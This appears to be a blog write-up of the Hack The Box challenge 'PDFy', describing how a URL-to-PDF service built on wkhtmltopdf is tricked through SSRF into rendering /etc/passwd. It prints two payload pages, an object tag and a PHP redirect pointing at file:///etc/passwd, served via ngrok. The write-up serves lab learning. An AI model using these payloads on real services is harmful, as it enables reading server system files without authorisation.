---
title: 'HTB PDFy Writeup (challenge)'
date: 2025-07-26
permalink: /posts/2025/07/HTB_PDFy_Writeup/
tags:
  - HTB
  - writeup
  - easy
  - challenge
---

A writeup of the Hack The Box challenge "PDFy" with easy difficulty

# PDFy (easy)

CHALLENGE DESCRIPTION

Welcome to PDFy, the exciting challenge where you turn your favorite web pages into portable PDF documents! It's your chance to capture, share, and preserve the best of the internet with precision and creativity. Join us and transform the way we save and cherish web content! NOTE: Leak /etc/passwd to get the flag!

This seems like a fun challenge!

![image.png](/images/challenges/HTB_PDFy/image.png)

We can search a site and it will format it to a PDF, nice

![image.png](/images/challenges/HTB_PDFy/image%201.png)

The site runs jQuery 3.5.1 and popper.js 2.4.4

So we fill in a URL at the site, the site sends a POST request to `/api/cache`.

The backend creates a PDF and places it on `/static/pdfs/<filename>`, that we see in an `<iframe>` .

Maybe we can let the backend render the `/etc/passwd` as a PDF.

We can try HTML injection plus SSRF:

I hosted a HTML page with a python server:

`python3 -m http.server 8080`

Then exposed my ip with NGROK

The HTML page:

```html
<!DOCTYPE html>
<html>
  <body>
    <h1>Leak /etc/passwd</h1>
    <object data="file:///etc/passwd" width="100%" height="800px"></object>
  </body>
</html>

```

But this gave me a blank PDF

![image.png](/images/challenges/HTB_PDFy/image%202.png)

The backend uses wkhtmltopdf so [file://](file://) is getting blocked by giving the error: malformed URL file. You get PDF files back from the API:

`/static/pdfs/<hash>.pdf` 

The trailing slash seems to be removed that is why it does not work.

I renamed the file to index.html so that this file automatically gets picked

```html
<!DOCTYPE html>
<html>
<body>
<h1>Pwned by Boskabouter</h1>
<?php
header('location:file:///etc/passwd');
?>
</body>
</html>
```

![image.png](/images/challenges/HTB_PDFy/image%203.png)